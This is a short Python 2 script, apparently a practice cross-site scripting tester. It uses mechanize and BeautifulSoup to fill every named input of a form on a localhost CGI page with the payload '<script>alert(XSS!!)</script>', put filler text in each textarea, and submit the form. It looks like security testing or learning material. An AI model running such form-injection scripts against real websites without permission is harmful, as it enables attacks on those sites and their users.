#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import mechanize
from BeautifulSoup import BeautifulSoup

count=0
url = "http://127.0.0.1:8000/cgi-bin/index.py"
br = mechanize.Browser()
page = br.open(url)

s_c = page.read()
s = BeautifulSoup(s_c)
br.select_form(nr=0)
for inputs in s.findAll("input"):
	name = inputs.get("name")
 	if name:
		br[name]="<script>alert(XSS!!)</script>"
		count=count+1

for textareas in s.findAll("textarea"):
	textarea = textareas.get("name")
	br[textarea]="This way is Python"
	count=count+1
if count:
	br.submit()
